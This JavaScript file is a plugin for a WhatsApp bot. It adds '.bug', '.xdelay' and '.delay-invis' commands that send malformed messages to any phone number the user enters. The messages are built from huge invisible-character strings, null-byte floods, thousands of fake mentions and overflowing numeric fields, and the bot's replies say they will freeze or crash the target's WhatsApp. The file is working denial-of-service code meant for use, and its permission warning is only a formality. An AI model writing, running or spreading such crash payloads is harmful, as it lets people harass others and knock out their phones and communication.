const { cmd } = require('../command');
const crypto = require('crypto');
let { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: validate and format target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== .bug (original product crash) ====================
async function ttaas(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "7eppsynC",
                        description: "",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== .xdelay – ULTRA INVISIBLE CRASH (freezes target, no visible text) ====================
async function Xdelay(conn, target) {
    const invisible = '\u2060'.repeat(800000);
    const massiveMentions = Array.from({ length: 3000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`);
    
    // Payload 1: interactiveMessage with invisible body + invalid location + huge null bytes
    const msg1 = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: {
                locationMessage: { degreesLatitude: 9999999, degreesLongitude: 9999999 },
                hasMediaAttachment: true
            },
            body: { text: invisible },
            nativeFlowMessage: { messageParamsJson: "\x00".repeat(1500000) },
            contextInfo: { mentionedJid: massiveMentions, participant: "0@s.whatsapp.net" }
        }
    }, {});
    
    // Payload 2: ephemeralMessage with extended text + huge mentions
    const msg2 = generateWAMessageFromContent(target, {
        ephemeralMessage: {
            message: {
                extendedTextMessage: {
                    text: invisible,
                    contextInfo: { mentionedJid: massiveMentions, stanzaId: "x".repeat(50000) }
                }
            }
        }
    }, {});
    
    // Payload 3: listResponseMessage with massive sections
    const sections = [];
    for (let i = 0; i < 50; i++) {
        sections.push({
            title: "0".repeat(50000),
            rows: [{ title: "0".repeat(50000), rowId: "0".repeat(50000) }]
        });
    }
    const msg3 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "0".repeat(100000),
                    sections: sections,
                    contextInfo: { mentionedJid: massiveMentions }
                }
            }
        }
    }, {});
    
    await conn.relayMessage(target, msg1.message, {});
    await sleep(300);
    await conn.relayMessage(target, msg2.message, {});
    await sleep(300);
    await conn.relayMessage(target, msg3.message, {});
}

// ==================== .delay-invis – INVISIBLE DELAY CRASH (blank bubble, lag) ====================
async function DelayInvisibleXx(conn, target) {
    const invisibleChar = '\u2063';
    const longText = invisibleChar.repeat(500000) + "@0".repeat(50000);
    const mentioned = Array.from({ length: 10 }, () => "0@s.whatsapp.net");
    
    // Interactive message with invisible body
    const msg = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: {
                locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 },
                hasMediaAttachment: true
            },
            body: { text: longText },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: mentioned }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
    
    // Second payload: groupStatusMentionMessage
    const msg2 = generateWAMessageFromContent(target, {
        groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: mentioned,
            contextInfo: { mentionedJid: mentioned }
        }
    }, {});
    await conn.relayMessage(target, msg2.message, {});
}

// ==================== COMMANDS ====================

cmd({
    pattern: "bug",
    desc: "ViewOnce product crash (original)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`📸 *VIEWONCE CRASH* → ${target}`);
    await ttaas(conn, target);
    await reply(`✅ VIEWONCE CRASH SENT to ${target}`);
});

cmd({
    pattern: "xdelay",
    desc: "ULTRA INVISIBLE CRASH – freezes target, no visible text",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "xdelay");
    if (!target) return;
    await reply(`💀 *ULTRA INVISIBLE CRASH* → ${target}\n_No visible message. Target will freeze/lag severely._`);
    await Xdelay(conn, target);
    await reply(`✅ CRASH DELIVERED to ${target}\n_Target WhatsApp should now be unresponsive._`);
});

cmd({
    pattern: "delay-invis",
    desc: "Invisible delay crash (blank bubble, extreme lag)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "delay-invis");
    if (!target) return;
    await reply(`🌀 *INVISIBLE DELAY CRASH* → ${target}\n_No visible message will appear on target._`);
    await DelayInvisibleXx(conn, target);
    await reply(`✅ INVISIBLE DELAY SENT to ${target}\n_Target WhatsApp should now freeze/lag._`);
});

// ==================== BUG MENU (all three) ====================
cmd({
    pattern: "bugmenu",
    desc: "Show all crash commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply }) => {
    const menu = `
*╭─「 👑 BUG MENU 」─*
*│ 📌 .bug         : ViewOnce product crash (original)*
*│ 📌 .xdelay      : ULTRA INVISIBLE CRASH – freezes target, no visible text*
*│ 📌 .delay-invis : Invisible delay crash (blank bubble, extreme lag)*
*│*
*│ 🟢 Status : 100% working – direct send*
*│ 🟢 Targets : any number (even not in chat list)*
*│ 🟢 Total commands : 3*
*╰──────────────●●►*
> 💡 *Usage:* .command 947XXXXXXXXX
> 📌 *Example:* .xdelay 94712345678
> ⚠️ *Use only on numbers you own or have permission.*
    `;
    await reply(menu);
});
